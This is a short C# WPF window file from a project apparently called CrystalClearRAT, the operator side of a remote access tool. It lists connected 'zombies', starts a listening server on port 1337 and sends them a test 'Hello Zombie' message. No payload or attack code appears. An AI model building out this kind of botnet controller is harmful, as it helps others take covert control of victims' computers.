using CrystalClearRAT.Web;
using CrystalClearRAT.ZombieModel;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

namespace CrystalClearRAT
{
    /// <summary>
    /// Logika interakcji dla klasy MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            zombieListView.ItemsSource = Zombie.Zombies;
        }

        private void Grid_Loaded(object sender, RoutedEventArgs e)
        {
            Server.Start(1337);

            //  Console.WriteLine(CrystalRATShared.Test.Hello);

            // Thread.Sleep(10);

        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Server.Send(Encoding.UTF8.GetBytes("Hello Zombie"), Zombie.Zombies[0]);
        }
    }
}
